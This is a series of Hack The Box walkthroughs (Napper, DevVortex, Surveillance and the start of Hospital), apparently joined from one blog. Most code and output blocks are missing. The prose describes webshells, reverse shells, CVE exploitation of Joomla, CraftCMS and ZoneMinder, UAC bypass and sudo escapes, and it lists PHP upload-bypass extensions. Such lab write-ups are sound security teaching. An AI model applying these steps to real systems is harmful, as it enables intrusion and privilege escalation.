There is an IIS malware that is processing requests sent to /ews/MsExgHealthCheckd/ with a base64 encoded Dotnet executable as the sdafwe3rwe23 parameter.
The notes also say that “will be testing local”, which implies it may be on this machine.
There are other detailed I’ll need to get from the Elastic blog post referenced by this post:
When the backdoor is successfully accessed, it returns a Server header with the string Microsoft-HTTPAPI/2.0 appended to the end.
An image of the malware source that shows how the assembly is invoked shows that it’s invoking a Run class in the decoded assembly:
The HTTP response headers just show the auth as well as that it’s IIS:
Nothing interesting once authenticated.

Category: Shell as ruben
I’ll try to see if this new path returns something on Napper. There’s a 404 on app.napper.htb (shown in Burp Repeater):
internal.napper.htb returns a 401 unauthorized:
If I add the authorization, it’s a 404:
If I just try napper.htb (or the IP), there’s a subtle change:
It’s still a 404, but the Server header is different. That’s a match to what was described in the Elastic post.
The post also mentioned having a parameter of sdafwe3rwe23. I’ll add this:
Still 404. I might need some value there, or I might need a different kind of request. I’ll change this to a POST request (right click, “Change request method”).
200 OK! That’s a good sign that I found the backdoor.
This blog post talks about writing a reverse shell in C#, and has a link to the source code here. Very similar code is also on revshells.com as “C# TCP Client”. It’s not clear to me which one was first.
I’ll paste in the code, and make a couple changes:
This gives the following code:
I’m going to compile this as a DLL using the mcs utility (apt install mono-devel):
There is a warning about err being defined to catch errors but never being used, but otherwise it works and rev.dll exists.
To upload this to Napper, I’ll base64 encode it:
I’ll paste this in as the body of the working backdoor connection in Burp Repeater. I’ll re-select all of this, and Ctrl-U to URL-encode characters like +. With nc listening on 443, I’ll send the request, and the shell connects back:
And I can grab user.txt:
I’ll also run powershell to switch from cmd.

Category: Shell as backup (administrator)
There are a few other users with home directories:
ruben is not able to access any of them. There’s nothing else if interest in ruben’s home directory either.
The C:\inetpub directory has the web roots for both sites, wwwroot and internal:
Both of these contain no code, only the static HTML pages for the site. This makes sense as the site is built with Hugo.
Interestingly, I’ll find the Hugo base directories in C:\temp\www:
For example, internal:
The posts are markdown (.md) files inside content\posts. For example, in app:
And in internal:
What’s interesting is that there’s an extra post in internal, no-more-laps.md.
Because it has the draft: true metadata at the top, it isn’t showing on the main site:
Local Administrator Password Solution, or LAPS, is a feature of Windows where the local administrator passwords for each machine are managed by the Active Directory environment. LAPS was introduces to combat the common practice of having the same password for all local administrators in a domain, which meant that once someone compromised one machine, they could be administrator on any machine.
The Napper team is moving away from laps in favor of a solution that lives in Elastic.
For some reason, there’s also a internal-laps-alpha folder in the posts folder. It has a binary and a .env file:
The .env has settings presumably used by the EXE:
Port 9200 (the default Elastic port) is listening on localhost:
I’ll download the latest Chisel and use smbserver.py to make a file share:
From Napper, I’ll mount the share:
Now I can copy chisel from the share onto Napper:
I’ll start the server on my host:
When I run the client on Napper:
There’s a connection at my VM:
Elastic DB is accessible over HTTPS. I’ll connect to https://127.0.0.1:9200/, and it asks for auth:
The credentials user:DumpPassword$Here works:
I can switch to curl and include the username and password in the URL:
I’ve enumerated Elastic before on Haystack, but a long time ago! There are two indices in the DB:
seed contains a single entry:
The interesting value there is 25229331.
user-00001 has one entry as well:
The document is stored as a base64-encoded blob in the blob entry.
I’ll copy a.exe onto my SMB share:
The file is a 64-bit non-.NET exe:
Running strings on the binary produces a ton of strings. At the top is:
This is a binary written in Go, which means that it’s statically compiled, which liked explains why there are so many strings.
I’ll open the binary in Ghidra and let it do it’s analysis. Once it’s done, there’s a main.main function. At the top, it’s using godotenv (a library for loading .env files) to get the Elastic information:
A bit further down, it’s using the go-elasticsearch module to connect:
Later, there’s an interesting part:
It’s calling main.randStringList(0x28), along with the output of main.genGey(Seed), and using main.encrypt to presumably encrypt the random string with the key generated from the seed. The result is written to the DB as the blob.
Later, that ranom_str is used in the command cmd /c net user backup [random_str]:
So when a.exe runs, it gets the seed from the DB and a random string, encrypts the string using a key generated from the seed, stores that in the DB, and then changes the backup user’s password to the random string.
If I can understand how to take the seed and decrypt the blob, I’ll have the backup user’s password.
This function is much shorter:
It’s using the seed to seed the math/rand.Rand function. Then it makes a 16 byte array, and loops 16 times generating a random int between 0 and 254, adds 1, and then stores it.
There is more going on here, but there’s really only one part that matters to me:
It’s using AES in cipher feedback mode (CFB). It’s possible the code is doing something weird, but most likely, if I can get the key, I can just use AES to decrypt.
Putting this all together, with a ton of help from ChatGPT, I’m going to write Go code that will get the current password of the backup user. In this video, I’ll walk through the process:
The final code is:
This will reach out to Elastic and pull down both the seed and blob values. Then it uses the seed to generate a key, and uses the key to decrypt the blob, returning the password.
This password seems to change every 5 minutes, so I’ll need to make sure to use it quickly or recompute.
With no WinRM or SSH, I’ll have to turn to RunasCs.exe, a binary that allows me to start a process as another user using their credentials.
I’ll upload a copy over SMB, and run it, giving it the username, password, command to run, and -r ip:port for a remote connection back on that ip / port:
At listening nc:
The backup user is in the Administrators group!
But I can’t access root.txt or even the Desktop folder:
This shell doesn’t have many privileges:
I’m being blocked by UAC. Fortunately for me, RunasCs.exe has a flag for this, --bypass-uac. I’ll kill the shell as backup and start the listening again. Back in the shell as ruben, I’ll run again:
This shell has lots of privilege:
And can grab the flag:
There is some kind of automation happening with the custom LAPS replacement, as I noticed while solving that the data in Elastic was changing every five minutes.
As an admin, I’ll start by listing all the scheduled tasks:
There’s a ton of tasks on any Windows instance, but the two interesting ones are right at the top.
I’ll fetch the details for each. cleanup runs a PowerShell script from the Administrator user’s AppData directory and runs every 5 minutes (PT5M is defined here):
This script is mostly about resetting things. For example, it resets all the Elastic stuff in case that gets messed up by HTB players. The script does invoke C:\Users\Administrator\AppData\Roaming\System32\napper.exe, which is exactly the same as a.exe. So this is what is doing the password rotation.
iisHelper runs a PowerShell script located in the ruben user’s AppData directory:
This one runs every one minute! It’s script is very simple:
It runs iisHelper.exe and waits for it to finish, which it shouldn’t. But if it does crash, it will start right again. And if the script were to crash, the scheduled task would bring it back up on the next run less than a minute later.
This binary is a .NET executable:
Looking in VT, it is detected as malware by many AV engines:
Interestingly, it was first submitted to VT only in late April, which suggests it isn’t exactly the same as the binary from the malware reporting from Elastic:
I’ll open the binary in DotPeek, where the assembly gives itself the name h3:
There are four functions inside the MsEXGHalthd class. Main starts a thread that will run Listener:
This function starts by creating a HttpListener object:
It is listening on the specific malware URL, and then enters an infinite while loop.
Inside the loop, there’s a bunch of code to handle parsing the incoming request. Eventually, there’s this bit that checks for the sdafwe3rwe23 parameter:
If it’s not found, it returns 404. If it is found, it processes it by saving the value to a temp file, and then calling RunA.exe [temp filename]:
That explains why the hash is unique to Napper. It’s been modified to what it does next. The screenshot in the Elastic Post showed it was called directly from this malware. I suspect the original malware was having issues when multiple players were trying to use it at the same time, so this modification was made so that each players request would start a new process and their shells would not hang the backdoor for other players.
DotPeek works on RunA.exe as well. It’s very simple:
Main handles the base64-decode, loading it as an Assembly, and then running the Run() constructor:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 25 Nov 2023
OS : Linux
Base Points : Easy [20]
Nmap scan:
Host is up (0.12s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpCategory: Recon
nmap finds two open TCP ports, SSH (22) and HTTP (80):
Based on the OpenSSH version, the host is likely running Ubuntu focal 20.04.
There’s a redirect on the webserver to http://devvortex.htb.
Given the user of host-based routing on the webserver, I’ll fuzz for any subdomains of devvortex.htb using ffuf with the following options:
It finds a subdomain that responds differently from all the other requests.
I’ll add both to my /etc/hosts file:
The website is for a web design / development company:
There is an email address at the bottom, info@devvortex.htb. The links to go pages like about.html, but they look just like the sections from the main page.
There are two forms that could take interaction. The newsletter signup takes an email, but clicking “Subscribe” just loads contact.html without even sending the email. The contact form also just moves to the top of the page, not even sending a request on clicking “Send”.
The site looks to be running static HTML pages. The main page loads as index.html, and the links lead to .html pages as well. The two interactive parts are not active either.
The 404 page is the default nginx 404 page:
I’ll run feroxbuster against the site to look for other paths on the webserver, giving it -x html to look for .html pages as well. It finds only the pages I already know about:
The dev site is different from the main one:
All the links go to places on the same page. There’s no forms to submit (though another email address, contact@devvortex.htb).
The main site on this virtual host loads as index.php, so it’s running PHP. Visiting a page that doesn’t exist (like index.html) shows an interesting 404 message:
The text here looks similar to 404 pages from Joomla:
And another example here:
Joomla’s admin page is at /administrator/, which does load a Joomla login form:
Another tell that it’s Joomla is the robots.txt file:
The specific version of Joomla is available at /administrator/manifests/files/joomla.xml:
It’s 4.2.6.

Category: Shell as www-data
Searching for “joomla 4.2.6 exploit”, the first three results are for CVE-2023-23752:
All of these are from Spring 2023, well before DevVortex was released.
CVE-2023-23752 is described by Nist as:
An issue was discovered in Joomla! 4.0.0 through 4.2.7. An improper access check allows unauthorized access to webservice endpoints.
It was originally described in this Chinese blog post (Google translate will do a pretty good job with it). It basically shows how there are group of Joomla APIs that effectively “merge” the query variables into where it’s storing variables (image from the blog post):
This is in the parseApiRoute function, which is responsible for handling all API requests, prepping their arguments, and passing them to the correct controller. The vulnerability is basically a mass assignment vulnerability, where the query variables are merged in and variables that shouldn’t be modified are. If the attacker specifies a GET parameter of public, the variable that says if the API requires authentication is overwritten with the user-supplied value and it becomes accessible, providing unauthenticated access to a bunch (well over 200) of APIs that an unauthenticated user should not have access to.
The updated code simply has a check for public and unsets it:
This post from Vulncheck goes into a discussion of how to use these information leaks to advance against a target. The most common path is to access the config/application API endpoint which returns the MySQL database configuration including password, and then to access MySQL. The post points out that MySQL shouldn’t be exposed to the internet, but it is a surprising amount of the time. Once in the DB, the attacker can create a user or change the password on an existing admin to get into the Joomla admin panel, and then edit a template or upload a plugin to get remote code execution (RCE).
The other attack scenario in the post is to use the users API end point to get the list of users, their emails, and their roles, and use this information for credential stuffing attacks.
I’ll try the same two endpoints mentioned in the blog above. I can access it easily with curl (using jq to pretty print) or in Firefox. The users endpoint shows two users:
lewis is an admin user on the site.
The config/application endpoint has the MySQL DB connection information:
I’ll try that password for lewis and logan over SSH, but it doesn’t work.
It seems that lewis does share the same password for the DB connection and their account on Joomla, as going to /administrator and login in works:
On originally solving, I started trying to modify a template, but ran into issues and pivoted to uploading a plugin. Later I realized that the template modification was possible, so I’ll show both:
The System option on the left admin panel side bar will open the System Dashboard:
I’ll click on “Site Templates” to open the templates page:
Clicking on the template “Cassoiopeia Details and Files” opens the editor for that template:
My initial thought was to modify the index.php file so if my specific argument was passed, it would show my webshell output instead of the site and i could just access it from /index.php?0xdf=id. Clicking on index.php loads the source into the editor:
To start, I’ll just add a simple meta tag to make sure it shows up:
But on clicking save, the following error comes up:
It is actually good practice to not have the templates writable at the OS level by the user running the webserver, and it seems that index.php is not!
I gave up too soon and moved to the plugin, but it’s always good to check other files. I’ll open error.php:
Whereas index.php was mostly HTML with some <?php> tags mixed in, this one is more like a PHP program. I’ll test writability with echo, and it works:
Visiting a page that doesn’t exist (like /0xdf) raises an error page:
At the top of the source is the echo output:
I’ll add the following PHP code to the top of error.php:
If the argument 0xdf is passed, run it with system and stop, and otherwise do the page as normal. It works:
Before finding a writable file, I just wrote a plugin for Joomla. Searching for Joolma webshell plugins will return many perfectly good results (like this), but it’s more fun to make my own. I’ll start with this Joomla page on making Plugins, and trim it down to just what’s necessary. I’ll walk through the process in this quick video:
At the end, I have a webshell:
From either webshell, I’ll get a shell by running a standard bash reverse shell with it:
I get a connection at nc:
I’ll upgrade my shell with the standard trick:

Category: Shell as logan
There’s only one user on this box with a home directory or a shell set:
www-data is able to read in this directory, but the only interesting file is user.txt, which www-data cannot read:
There is a logan user in Joomla, and I already have the MySQL connection information from the leak of:
I’ll connect:
There are no other interesting databases:
There are 71 tables in joomla:
I’m most interested in sd4fg_users:
I’ll save those to a file:
I’ll pass this file to hashcat along with the rockyou.txt wordlist. It starts in auto-detect mode, but fails as there are multiple possible matches:
Unless I know otherwise, it’s always worth trying basic bcrypt (3200). I can also start in the background registering an account and then fetching the password to try to crack it with different modes to see which it is. But I won’t need that here as 3200 works rather quickly for logan’s hash:
I’ll kill this and try the DB password for lewis, and it works:
From my shell, I can run su - logan and enter the password to get a shell as logan:
Or I can SSH from my box:
Either way, I can grab user.txt:

Category: Shell as root
logan can run apport-cli as root with sudo:
My first thinking when seeing this sudo configuration is to look at how this application might read / write files. apport is the application / package that is responsible for taking actions when a program crashes on Linux. apport-cli is:
apport automatically collects data from crashed processes and compiles a problem report in /var/crash/. This is a command line frontend for reporting those crashes to the developers. It can also be used to report bugs about packages or running processes.
By default, apport-cli looks over crashes in /var/crash and sends them to application developers. /var/crash is empty:
Looking at the man page (man apport-cli), there are a few potential interesting options:
I’ll try a bunch of combinations of these, but without generating anything interesting. There is no entry to apport-cli in GTFObins, which after a HTB box being out so long would be very surprising if that were the intended way.
The version of apport-cli on DevVortex is 2.20.11:
Searching for “apport-cli 2.20.11 exploit” returns posts about both CVE-2021-3899 and CVE-2023-1326.
Details about CVE-2021-3899 are sparse. This POC is what comes up in my search, but I don’t think the situation is useful here.
CVE-2023-1326 is:
A privilege escalation attack was found in apport-cli 2.26.0 and earlier which is similar to CVE-2023-26604. If a system is specially configured to allow unprivileged users to run sudo apport-cli, less is configured as the pager, and the terminal size can be set: a local attacker can escalate privilege.
This is very similar to the vulnerability I exploited in Sau where systemctl opened in less and I could break out.
To exploit this vulnerability, I’ll need to give apport-cli crash data to view, and then when it shows the report in less, break out to a shell. I’ll show three different ways to generate crash data:
To exploit this, I’ll need something legit to read. The easiest way is to just generate a dump file. I’ll start program running in the background:
& tells the OS to run the program in the background, and return focus to the shell. 7650 is the process id (PID) for that process. I’ll send a signal to that process to crash it with kill -ABRT:
The command returns (after sending the signal) and prints the next prompt, and after a slight delay, when the sleep process dies, it prints to the terminal. Now there’s a dump file in /var/crash:
Now I can run apport-cli pointing to this file:
There are alternative ways to generate dump data to look at. For example, running apport-cli -f will offer a menu of choices:
Entering “1”, brings another menu:
Entering “2” here generates a report:
I can’t just give apport-cli any file, as I tried with root.txt and root’s id_rsa:
It turns out what is requires is not much:
That’s enough to generate a report:
Regardless of how I got to this menu, here I’ll enter “V”:
At this menu, I can select “V” to get back into less. It takes a minute generating a report depending on the report size. Once it’s done, it opens in less:
To escape from less, I’ll type !/bin/bash, and I’m dropped to a root shell:
And I’ll grab the root flag:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 09 Dec 2023
OS : Linux
Base Points : Medium [30]
Creators : TheCyberGeekTRX
Nmap scan:
Host is up (0.11s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpCategory: Recon
nmap finds two open TCP ports, SSH (22) and HTTP (80):
Based on the OpenSSH version, the host is likely running Ubuntu 22.04 jammy.
There’s a redirect on the webserver to http://surveillance.htb. I’ll fuzz with ffuf to look for any subdomain that respond differently, but not find any. I’ll add this to my /etc/hosts file.
The site is for a home security company:
All of the links lead to other places on the page. There is an email address at the bottom, demo@surveillance.htb.
The bottom of the page says “Powered by Craft CMS”. CraftCMS is a content management system written in PHP (as can be determined looking at the project on GitHub). The index page also loads as index.php. The “Powered by” text has a link to the version 4.4.14 branch on GitHub.
The HTTP response headers also show CraftCMS:
I’ll run feroxbuster against the site, and include -x php since I know the site is PHP. Unfortunately, once a minute or so has passed, everything starts returning 502 and 503:
This behavior happens each time I run it. The only potentially interesting find is /admin, which loads a login page:

Category: Shell as www-data
Searching for CVEs in CraftCMS, there’s an interesting 2023 one that was published a couple months before Surveillance was released:
The nist page doesn’t give a very good description:
Craft CMS is a platform for creating digital experiences. This is a high-impact, low-complexity attack vector. Users running Craft installations before 4.4.15 are encouraged to update to at least that version to mitigate the issue. This issue has been fixed in Craft CMS 4.4.15.
Give this seems like 4.4.14, it should be vulnerable. If I filter my search to look for things before 9 December 2023, I’ll find this Qualys post from 25 September. The vulnerability is a pre-authentication PHP object injection vulnerability that can lead to remote code execution!
The issue is that there is a PHP class that has a beforeAction method that allows an attacker to create an arbitrary PHP object.
Craft CMS has a relatively small pre-auth attack surface like other content management systems. But the \craft\controllers\ConditionsController class has a beforeAction method that may allow an attacker to create an arbitrary object.
Craft CMS and its dependents’ code bases contain several tools that can invoke methods selectively, such as \GuzzleHttp\Psr7\FnStream or including arbitrary files. An attacker may inject some PHP code into the Craft CMS’s log file on successful exploitation.
It also includes the vulnerable code:
And this image as a POC:
Since Surveillance’s release, there are many POCs available on GitHub to pull off this exploit very easily. To capture the experience of trying to solve this around release time, I’ll focus on posts that were available then. I’ll also show a POC just for fun at the end.
The first step is to confirm that this site is vulnerable, testing the given POC. It’s minorly annoying to type the POST body into Burp Repeater by hand, and typos will lead to 500 errors. But once I get it right:
I’ve been able to inject phpinfo into the page. That is proof of vulnerability.
In the PHP Info page there’s some useful data to collect. The document root for the webserver is /var/www/html/craft/web:
There’s also a full section on imagick (The ImageMagick class):
Turning this into remote code execution is very similar to the arbitrary object instantiation exploitation in Intentions, which was based on this blog post. The exploit there is to upload a Magick Scripting Language (MSL) file, and then reference it with PHP’s ImageMagick to get arbitrary file write.
There’s two major differences here:
PHP stores all files attached to a POST request in upload_tmp_dir (typically /tmp) while it processes the request. However, if I can crash PHP, then it is possible that it will miss that cleanup and leave the temporary files behind.
To do that manually in Burp Repeater is a bit intimidating, but doable. I’ll work in small steps. First, I’ll convert the POST request from a POST to form data by updating the Content-Type header to define a boundary and moving each argument into it’s own block (delimited by the boundary proceeded by two dashes):
Sending this still returns the phpinfo output. I’ll add another block with a fake file:
Sending this still shows phpinfo, and the file is saved on disk for a fraction of a second, but then deleted.
The trick is to have ImageMagick crash before the file is cleaned up. I’ll replace the GuzzleHttp invocation with a reference to imagick and have it try to open a non-MSL file as an MSL file:
This will crash ImageMagick and prevent PHP from cleaning up the files.
I don’t have a good way to see this on target. The cleanest thing to do would be to run a copy of CraftCMS locally. From a Beyond Root point of view, I can see this creates the file:
Now that I can upload, I’ll use the same trick as Intentions to write a webshell using an MSL file:
The MSL file reads the static webshell text and writes it into the webroot identified above.
Now I need to invoke that MSL using imagick. I’ll send that file upload request to another Repeater window and make some changes:
This hangs for a second before returning 502 Bad Gateway.
But the webshell is in the web root:
The original author of the box took a slightly different path towards abusing the arbitrary object instantiation to solve the issue of getting a webshell following details in this post by the vulnerability’s discoverer:
After including the log, PHP will still crash on the request, not returning the results. Therefore, I’ll have PHP in the log create a webshell in the web root that can be used repeatedly.
Starting with the original POC, I’ll replace the GuzzleHttp class with PhpManager, using the itemFile to show what file to include. The log file location (which includes today’s date) is from the CraftCMS documentation. I’ll modify the User-Agent header to be some PHP to write a file in the web root.
On sending this twice (once to write the log and once to reference it), there’s a file in the web root:
Updating the User-Agent to write a PHP webshell instead of “test” is trivial.
Faelian has a really nice POC for CVE-2203-41892 that is held in a single Python script. It follows the same steps I did manually using ImageMagick.
In lines 32-62, it runs the POC to get phpinfo output, and gets the tmp_dir and document_root from it:
In lines 64-81 it uploads the MSL file to /tmp by crashing imagick on /etc/passwd:
The comment about uploading “shell.php” isn’t really accurate, as it’s really uploading the MSL file to make “shell.php”.
In lines 84-93 it uses imagick to to write (not so much move) the webshell:
The rest of the script is a loop to take in commands, pass them to the webshell, and print the result.
It works very nicely:
Through any of these methods I’ll get a webshell. To upgrade that to a reverse shell, I’ll pass a simple bash reverse shell to the webshell:
This hangs, but at listening nc:
I’ll upgrade my shell using the standard PTY trick:

Category: Shell as matthew
There are two users with home directories in /home:
www-data doesn’t have access to either.
There’s not much of interest in the website directory. The docs show there could be a db.php file in config, but there isn’t:
It could also be in the .env file, which it is:
I’ll connect:
There’s a lot of tables, but users seems most interesting:
There’s only one row, for Matthew the admin:
That is a Blowfish hash. I’ll try to crack it with hashcat and rockyou.txt, but it’s very slow, and after 5 or so minutes when it has nothing, give up on that.
Looking around at the filesystem structure of the CMS, there’s the storage directory where logs are kept:
There is something in the backups dir:
I’ll unzip it and it’s quite long:
Towards the bottom is the users table:
Still only one user, but a different kind of hash, this time SHA256. I’ll save it to a file and pass it to hashcat:
It can’t auto recognize the format. I’ll assume its the simplest one to start - SHA256 is fast to crack, and I can go back and try to research more if it doesn’t work.
It completes in a matter os seconds.
This password works with su and the matthew user on Surveillance:
It also works over SSH:
Either way, I can claim user.txt:

Category: Shell as zoneminder
Matthew’s home directory is very empty:
There aren’t any interesting files owned by matthew, and the /proc filesystem is mounted with hidepid=invisible:
There is another service listening on TCP 8080:
I’ll reconnect SSH using -L 8888:localhost:8080 to tunnel anything hitting port 8888 on my host through the SSH session and to TCP 8080 on localhost of Surveillance.
Visiting http://localhost:8888 shows a ZoneMinder login page:
ZoneMinder is a free and open source:
Closed-circuit television software application developed for Linux which supports IP, USB and Analog cameras.
The username matthew / starcraft122490 doesn’t work to log in, but admin / starcraft122490 does!
This is version 1.36.32 according to the banner at the top right under “STOPPED”.
Searching for ZoneMinder vulnerabilities (again with a filter for things before 9 December 2023 when Surveillance released) reveals CVE-2023-26035:
Versions prior to 1.36.33 and 1.37.33 are vulnerable to Unauthenticated Remote Code Execution via Missing Authorization. There are no permissions check on the snapshot action, which expects an id to fetch an existing monitor but can be passed an object to create a new one instead. TriggerOn ends up calling shell_exec using the supplied Id. This issue is fixed in This issue is fixed in versions 1.36.33 and 1.37.33.
Metasploit added an exploit in November 2023.
To exploit this, I’ll need to get a CSRF token from the index page:
It does seem to change on each request.
This Feb 2023 post gives nice details on the vulnerability. It is in the snapshot view, where it takes the user input id and without sanitizing it, makes a command including the id that’s run via shell_exec.
From the Metasploit exploit I’ll get the URL and data format.
Testing with a sleep seems to show whatever command is run is run twice:
The output is not returned, so it’s blind, but that’s ok.
To get a shell, I’ll just make a copy of bash and set it SetUID/SetGID:
From the shell as matthew:
Running with with -p returns a shell with effective ids of zoneminder:
I like to have a shell fully as the user I’m working as, so I’ll get a shell over SSH. There’s no .ssh directory in /home/zoneminder, so I’ll add one:
It’s important that my shell has both effective user and group ids as zomeinder, or I won’t be able to set the permissions correctly:
Now I can SSH as zoneminder:

Category: Shell as root
The zoneminder user can run Perl scripts that start with zm in /usr/bin as any user with sudo:
There are a bunch of scripts that meet this regex:
There are several ways to exploit the various ZoneMinder scripts to get a shell as root. I’ll show the two:
To look at these function, I’ll spend a bunch of time running grep to look for ways to run system commands via Perl such as exec, system, or qx. There are many cases where either no user input is passed to the call, or where the user input passed is filtered (checked to be all alphanumeric).
Eventually I’ll stumble upon zmupdate.pl. It has two places that build a command string and pass it to qx one of the Perl functions to run a system command. One is in the patchDB function, and the other is in the main code that runs while called.
I’ll start at the code that calls qx (around line 432 on Surveillance):
It’s calling $command. $command is defined between lines 411 and 430:
It starts with sqldump, and then builds the command using variables. The $dbpass variable is escaped nicely with single quotes around it to prevent injection (or weird behavior with special characters in spaces). The rest are not.
Looking at the help for the script, I have control over the dbuser:
There are a series of steps to get to this point in the code where I can try to inject. Scrolling up at line 373, there’s a check where the indentation looks like this is outside any previous if blocks:
It requires the -v input, and that is stripped of all non-word characters (so can’t be injected). The version needs to be different from the current version.
Then there’s a check that $interactive is true, which is the default:
There’s a couple other blocks of code that I don’t really care about, and then this option put to the user:
I’ll need to say yes here to get to the qx call on line 432 (though it turns out that even with no I’ll still hit the other call to qx and the same injection works).
With all of this together, I’ll pass in a user name with $([cmd]) that will then get passed to qx and run by the OS. I’ll have it create another SetUID/SetGID bash. I’ll need to give a version that isn’t the current (which happens to be 1.36.32):
The result is a shell as root! And the root flag:
It created the bash:
Running it gets a root shell:
And root.txt:
The intended way involves seeing an interesting setting in the ZoneMinder options.
In clicking around in ZoneMinder, the “Options” menu has a “Config” page:
About half way down is one that seems interesting:
Clicking the “?” generates this pop-up:
I’ll create the following short C program (just like in Clicker):
I’ll compile it and copy it to Surveillance:
I’ll update the setting in ZoneMinder. There seems to be a cron clearing this setting every minute, so it’s worth setting this again just before running the commands.
The command to run according to the help screen is zmdc.pl. Running it shows the help menu:
It’s not clear where in the process ZoneMinder injects the LD_PRELOAD. It is clear the help menu is not enough.
Because I’m trying to “launch zmdc”, I’ll use the startup command:
Now there’s a new SetUID/SetGID binary:
Running with -p to not drip privs gives a shell with effective ids of root:
Which is enough to read the flag:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 18 Nov 2023
OS : Windows
Base Points : Medium [30]
Nmap scan:
Host is up (0.12s latency).
Not shown: 65510 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
443/tcp  open  https
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
1801/tcp open  msmq
2103/tcp open  zephyr-clt
2105/tcp open  eklogin
2107/tcp open  msmq-mgmt
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
6406/tcp open  boe-processsvr
6407/tcp open  boe-resssvr1
6410/tcp open  boe-resssvr4
6617/tcp open  unknown
6644/tcp open  unknown
8080/tcp open  http-proxy
9389/tcp open  adwsCategory: Recon
nmap finds many open TCP ports:
This combination of ports looks like a Windows Domain Controller. Many of the ports show a domain of hospital.htb, and the hostname of DC.hospital.htb is leaked on the TLS certificate on some of the LDAPS ports. There are two potential webservers, HTTPS on 443 and HTTP on 8080.
The Apache server on 8080 shows Ubuntu, which suggests that perhaps this box has a Linux container running on it.
Based on these ports, I’ll prioritize as:
There are several indicators here that multiple OSes are running. To start, it’s interesting to see WinRM and SSH. The ports clearly are similar to a Windows domain controller (which matches HTB’s label of Windows for this box). Port 8080 has an Apache server string that mentions Ubuntu, while port 443 has an Apache server string that says Windows. Given all of this, it seems likely that this SSH is for the Linux VM / container running on a Windows host.
I’ll run a quick ffuf to brute force the HTTP and HTTPS ports for any subdomains of hospital.htb that returns a different site, but not find anything. I’ll update my /etc/hosts file:
There doesn’t seem to be any unauthenticated access over SMB:
The service on HTTPS is an instance of RoundCube, a webmail service:
Under the login page it says “Hospital Webmail”.
RoundCube is an open-source PHP-base webmail service available on GitHub. From the login page, it’s possible to get the version by looking at the page source:
10604 maps to 1.6.4, as can been seen in rc_mail_output_html.php here:
According to the releases page, this version was release on Oct 16 2023.  1.6.5 released on Nov 5, and Hospital released on HTB on Nov 18. There’s no obvious vulnerabilities in 1.6.5 worth exploiting, and this suggests that 1.6.4 was the latest version while Hospital was under development. As Hospital retires, the latest version is 1.6.6. Nothing jumps out as potentially exploitable in 1.6.4.
This page also presents a login page:
Unlike RoundCube, there’s no obvious public software, but rather the site seems custom to Hospital. There’s also a link to make an account.
When I make an account and log in, there’s a form to upload medical records:
A peak at the HTML input shows that it accepts images:
If I give it an image and hit Upload, it lands the browser on /success.php:
I’ll run feroxbuster against the site, and include -x php since I know the site is PHP:
The /uploads directory is interesting, and the uploaded image is in this directory as well without a filename change:
This directory is cleaned out every minute or two.

Category: Shell as www-data on webserver
I’ll start by sending the successful image upload to Burp repeater. The first thing I want to look for is if it is checking the magic bytes of the file. I’ll delete the entire image, and replace it with text:
It returns success. I can try a simple PHP script (it’s always good to start with a simple script before going for a webshell) instead and it still uploads, and I can fetch it from the uploads directory:
The problem here is that the server is not treating it as PHP, but rather as a raw file (like an image).
I need to change the saved file name such that Apache recognizes it and sends it to PHP for processing. I can try a double extension (like lego.php.png), but that still returns the raw PHP (it’s not executed).
The HackTricks page on File Upload has a list of other extensions that are commonly handled and executed as PHP:
.php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module
I’ll create a wordlist that contains these extensions, and generate a ffuf command to fuzz for any that allow upload:
A few of these extensions allow for uploads. Each of these would have already uploaded the file, so I’ll turn these extensions into a wordlist, and fuzz again. This time much simpler. The uploaded PHP is 21 characters long. If it executes, it will output only four characters, “RCE!”.
Any of the responses that are 21 in size are returning the unexecuted PHP code. The .phps file seems to generate a 403 forbidden. And the .phar seems to be executing. I’ll confirm that manually:
The obvious next step (or first step if I wasn’t wise enough to start with an echo) would be to upgrade this PHP to a webshell:
The upload works, but when triggering it doesn’t result in execution:
The response is just empty.
The phpinfo function is a debug function in PHP that will show all sorts of information about the server and it’s configuration. I’ll update my script to:
Now it has all this information:
disable_functions is a configuration that blocks certain PHP functions from being executed:
The configuration on Hospital includes system (which I was trying in my webshell) as well as many of the other ways to run system commands through PHP.
I’ll show a three ways to bypass the disabled functions for this case.
The simplest is to recognize that the author forgot to block one of the PHP functions that will give execution - popen. This was the intended exploitation on Moderators, and there was a similar path on UpDown. In UpDown I showed dfunc-bypasser, which is a Python script you point at phpinfo() output and it flags available dangerous functions. I don’t love this tools, as it’s legacy python, and it makes more sense to do this in PHP. IppSec made a quick PHP script to do this, and I’ll borrow from that (with slight modifications):
It loops over the dangerous functions, and if they exists, prints it to the screen. I’ll upload that as 0xdf.phar, and load the page:
Knowing that popen works, I’ll work with that. The PHP docs for popen show that it opens a file pointer to the process. I’ll use the same payload I used on Moderators:
Once uploading, it works:
A nicer PHP webshell that is very common now is p0wny-shell. I’ll copy the contents of shell.php, and upload it through Burp Repeater:
Now on visiting /uploads/p0wny.phar, I get a slick interactive shell in the browser:
Under the hood, this shell has an executeCommand function that starts on Line 25:
It basically checks for each way of getting execution, and when it finds one, runs it. So this works here, but only because popen is not blocked.
weevely is almost a full post exploitation framework rather than just a webshell. It works by using a Python script to generate a PHP file to upload. Then the same Python script takes the URL to the uploaded file and manages interacting providing a shell with a ton of plugins.
I’ll generate an agent giving it an output filename and a password:
The output is a jumbled mix of PHP code and binary data that the Python script can interact with:
I’ll upload it to Hospital using the form, and the connect with weevely:
Regardless of which method I use to get RCE, I’ll get a reverse shell using a bash reverse shell:
At nc:
I’ll upgrade the shell using the standard trick:

Category: Shell as root on webserver
Clearly this is not a Windows OS. The webserver is running on Ubuntu 23.04:
